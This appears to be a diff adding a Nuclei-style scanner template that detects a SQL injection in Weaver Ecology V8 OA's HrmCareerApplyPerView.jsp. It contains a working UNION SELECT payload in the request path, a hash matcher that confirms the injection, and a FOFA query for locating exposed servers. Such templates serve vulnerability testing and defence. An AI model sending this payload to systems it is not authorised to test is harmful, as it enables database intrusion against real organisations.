@@ -1,0 +1,27 @@
+id: ecology-HrmCareerApplyPerView-sql
+
+info:
+  name: Ecology V8 - SQL Injection
+  author: cr
+  severity: high
+  reference:
+    - 
+  metadata:
+    fofa-query: app="泛微-协同办公OA"
+  tags: ecology,sqli
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1+union+select+1,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "0x900150983cd24fb0d6963f7d28e17f72"
+
+      - type: status
+        status:
+          - 200
